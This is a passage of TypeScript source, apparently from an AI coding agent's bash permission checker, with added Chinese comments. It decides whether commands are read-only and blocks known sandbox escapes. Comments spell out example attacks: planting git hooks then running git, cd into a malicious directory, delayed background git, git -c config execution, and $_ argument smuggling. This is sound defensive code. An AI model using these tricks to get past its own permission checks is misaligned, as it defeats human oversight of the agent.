      inDoubleQuote = !inDoubleQuote
      continue
    }

    // Inside single quotes: everything is literal. Skip.
    if (inSingleQuote) {
      continue
    }

    // Check `$` followed by variable-name or special-parameter character.
    // `$` expands inside double quotes AND unquoted (only SQ makes it literal).
    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return true
      }
    }

    // Globs are literal inside double quotes too. Only check unquoted.
    if (inDoubleQuote) {
      continue
    }

    // Check for glob characters outside all quotes.
    // These could expand to anything, including dangerous flags.
    if (currentChar && /[?*[\]]/.test(currentChar)) {
      return true
    }
  }

  return false
}

/**
 * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
 * Internal helper function that validates individual commands.
 *
 * @param command The command string to check
 * @returns true if the command is read-only
 */
/**
 * 【做什么】判定单条命令是否只读
 * 【为什么需要】把「预处理 → 白名单 → 正则表 → git 特例」串成一条判定流水线
 * 【入参】command：单条命令（已拆过复合命令）
 * 【返回】true = 只读
 * 【关键步骤】
 *   ① 去掉结尾的 2>&1（把 stderr 并入 stdout 不影响只读性，属于常见无害写法）
 *   ② Windows UNC 路径（\server\share 形式）可能触发 WebDAV 攻击 → 直接否
 *   ③ 存在未加引号的通配符/变量 → 否
 *   ④ 优先走白名单判定（isCommandSafeViaFlagParsing）
 *   ⑤ 再逐个试正则表；命中后还要额外拦 git 的三个高危 flag（-c / --exec-path / --config-env）
 */
function isCommandReadOnly(command: string): boolean {
  // Handle common stderr-to-stdout redirection pattern
  // This handles both "command 2>&1" at the end of a full command
  // and "command 2>&1" as part of a pipeline component
  let testCommand = command.trim()
  if (testCommand.endsWith(' 2>&1')) {
    // Remove the stderr redirection for pattern matching
    testCommand = testCommand.slice(0, -5).trim()
  }

  // Check for Windows UNC paths that could be vulnerable to WebDAV attacks
  // Do this early to prevent any command with UNC paths from being marked as read-only
  if (containsVulnerableUncPath(testCommand)) {
    return false
  }

  // Check for unquoted glob characters and expandable `$` variables that could
  // bypass our regex-based security checks. We can't know what these expand to
  // at runtime, so we can't verify the command is read-only.
  //
  // Globs: `python *` could expand to `python --help` if such a file exists.
  //
  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
  // last arg of the previous command. With IFS word splitting, this smuggles
  // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
  // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
  // commands; hand-written regexes in READONLY_COMMAND_REGEXES (uniq, jq, cd)
  // have no such guard. See containsUnquotedExpansion for full analysis.
  if (containsUnquotedExpansion(testCommand)) {
    return false
  }

  // Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
  // Regex filters can be bypassed, so we use strict allowlist validation instead.
  // This requires defining a set of known safe flags. Claude can help with this,
  // but please look over it to ensure it didn't add any flags that allow file writes
  // code execution, or network requests.
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

  for (const regex of READONLY_COMMAND_REGEXES) {
    if (regex.test(testCommand)) {
      // Prevent git commands with -c flag to avoid config options that can lead to code execution
      // The -c flag allows setting arbitrary git config values inline, including dangerous ones like
      // core.fsmonitor, diff.external, core.gitProxy, etc. that can execute arbitrary commands
      // Check for -c preceded by whitespace and followed by whitespace or equals
      // Using regex to catch spaces, tabs, and other whitespace (not part of other flags like --cached)
      // git -c 可以内联设置任意 git 配置，其中 core.fsmonitor、diff.external、core.gitProxy 等
      //   都能指定「要执行的命令」——等于把只读命令变成代码执行，必须拦
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
      // The --exec-path flag allows overriding the directory where git looks for executables
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // Prevent git commands with --config-env flag to avoid config injection via environment variables
      // The --config-env flag allows setting git config values from environment variables, which can be
      // just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * Checks if a compound command contains any git command.
 *
 * @param command The full command string to check
 * @returns true if any subcommand is a git command
 */
// 整条命令里有没有 git 子命令——后面三条沙箱逃逸检查都以它为前提
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * Git-internal path patterns that can be exploited for sandbox escape.
 * If a command creates these files and then runs git, the git command
 * could execute malicious hooks from the created files.
 */
// git 的「内部结构」路径：HEAD、objects/、refs/、hooks/。
//   如果一条命令**先**在当前目录造出这些文件，**再**跑 git，git 就会把这个目录当成仓库，
//   进而执行 hooks 里的恶意脚本（这就是所谓的「裸仓库攻击」）
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
 */
function isGitInternalPath(path: string): boolean {
  // Normalize path by removing leading ./ or /
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// Commands that only delete or modify in-place (don't create new files at new paths)
// 这三个命令虽然是写操作，但不会「在新路径上新造文件」（rm 是删、sed 是就地改），
//   所以排查「是否造出 git 内部文件」时可以把它们排除掉，避免误报
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * Extracts write paths from a subcommand using PATH_EXTRACTORS.
 * Only returns paths for commands that can create new files/directories
 * (write/create operations excluding deletion and in-place modification).
 */
// 从一条子命令里提取「会被写入的路径」：先判断命令类型是不是 write/create，再用路径提取器取路径
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // Only consider commands that can create files at target paths
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * Checks if a compound command writes to any git-internal paths.
 * This is used to detect potential sandbox escape attacks where a command
 * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
 *
 * SECURITY: A compound command could bypass the bare repo detection by:
 * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
 * 2. Then running git, which would execute malicious hooks
 *
 * Example attack:
 * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command The full command string to check
 * @returns true if any subcommand writes to git-internal paths
 */
/**
 * 【做什么】检查复合命令里有没有「往 git 内部路径写东西」的动作
 * 【为什么需要】配合下面的检查，堵住「先造 hooks 再跑 git」的沙箱逃逸
 * 【返回】true = 存在这类写入
 * 【关键步骤】
 *   ① 拆成子命令
 *   ② 对每条子命令取写入路径（mkdir/touch/cp/mv 等），逐个比对是否是 git 内部路径
 *   ③ 再检查输出重定向目标（如 `echo x > hooks/pre-commit`）——重定向也是写入途径
 */
function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // Check write paths from path-based commands (mkdir, touch, cp, mv)
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // Check output redirections (e.g., echo x > hooks/pre-commit)
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * Checks read-only constraints for bash commands.
 * This is the single exported function that validates whether a command is read-only.
 * It handles compound commands, sandbox mode, and safety checks.
 *
 * @param input The bash command input to validate
 * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
 *                              This is computed by commandHasAnyCd() and passed in to avoid duplicate computation.
 * @returns PermissionResult indicating whether the command is read-only
 */
/**
 * 【做什么】只读约束检查的对外主入口（整条命令级别）
 * 【为什么需要】只读命令可以免询问放行，这是权限链里最「省事」的一环，也是体验最好的一环
 * 【入参】input：工具入参；compoundCommandHasCd：整条复合命令里是否含 cd（上层已算好，避免重复计算）
 * 【返回】allow（确认只读，直接放行）/ passthrough（判不了，交给权限链的后续环节）
 * 【关键步骤】
 *   ① 命令解析不了 → passthrough（不猜）
 *   ② 先用 bashSecurity 的兜底检查扫一遍整条命令（拆分会改变原文形态，所以要在拆分**之前**查）
 *   ③ 检查 Windows UNC 路径（同样要在拆分前，因为拆分可能改变反斜杠）
 *   ④ 三条 git 沙箱逃逸检查：cd+git 组合、当前目录像裸仓库、先写 git 内部文件再跑 git
 *   ⑤ 开了沙箱且 cwd 已离开原始目录时，git 命令不放行（防止后台任务的竞态绕过）
 *   ⑥ 逐条子命令判只读，全部只读 → allow
 */
export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  const { command } = input

  // Detect if the command is not parseable and return early
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: 'Command cannot be parsed, requires further permission checks',
    }
  }

  // Check the original command for safety before splitting
  // This is important because splitCommand_DEPRECATED may transform the command
  // (e.g., ${VAR} becomes $VAR)
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: 'Command is not read-only, requires further permission checks',
    }
  }

  // Check for Windows UNC paths in the original command before transformation
  // This must be done before splitCommand_DEPRECATED because splitCommand_DEPRECATED may transform backslashes
  if (containsVulnerableUncPath(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
    }
  }

  // Check once if any subcommand is a git command (used for multiple security checks below)
  const hasGitCommand = commandHasAnyGit(command)

  // SECURITY: Block compound commands that have both cd AND git
  // This prevents sandbox escape via: cd /malicious/dir && git status
  // where the malicious directory contains fake git hooks that execute arbitrary code.
  // 攻击示例：`cd /malicious/dir && git status` —— 那个目录里可能放了伪造的 hooks，
  //   git 会在执行过程中把它们跑起来。所以只要复合命令里同时出现 cd 和 git，就不自动放行
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands with cd and git require permission checks for enhanced security',
    }
  }

  // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
  // This prevents sandbox escape when an attacker has:
  // 1. Deleted .git/HEAD to invalidate the normal git directory
  // 2. Created hooks/pre-commit or other git-internal files in the current directory
  // Git would then treat the cwd as the git directory and execute malicious hooks.
  // 攻击手法：先删掉正常的 .git/HEAD 让仓库失效，再在当前目录造 hooks/ 等文件，
  //   git 就会把**当前目录**当成 git 目录并执行里面的 hook
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands in directories with bare repository structure require permission checks for enhanced security',
    }
  }

  // SECURITY: Block compound commands that write to git-internal paths AND run git
  // This prevents sandbox escape where a command creates git-internal files
  // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
  // malicious hooks from the newly created files.
  // Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
  // 攻击手法：同一条命令里 `mkdir -p hooks && echo '恶意脚本' > hooks/pre-commit && git status`
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands that create git internal files and run git require permission checks for enhanced security',
    }
  }

  // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
  // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
  // Race condition: a sandboxed command can create bare repo files in a subdirectory,
  // and a backgrounded git command (e.g. sleep 10 && git status) would pass the
  // isCurrentDirectoryBareGitRepo() check at evaluation time before the files exist.
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    // 竞态场景：沙箱内命令先在子目录造好裸仓库文件，再起一条后台 git 命令（如 `sleep 10 && git status`），
    //   权限判定那一刻文件还没造出来，于是通过检查，等真正执行时文件已经在了。
    //   所以只要 cwd 已不在原始目录，git 命令一律不放行
    getCwd() !== getOriginalCwd()
  ) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands outside the original working directory require permission checks when sandbox is enabled',
    }
  }

  // Check if all subcommands are read-only
  // every ≈ allMatch：一条命令里只要有一段不是只读，整条就不能当只读放行
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  // 只有 allow 这一种「正面结论」；其余一律 passthrough 交给后续环节——
  //   本模块**从不主动 deny**，因为「不是只读」不等于「不允许」，可能还有规则表能放行它
  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // If not read-only, return passthrough to let other permission checks handle it
  return {
    behavior: 'passthrough',
    message: 'Command is not read-only, requires further permission checks',
  }
}
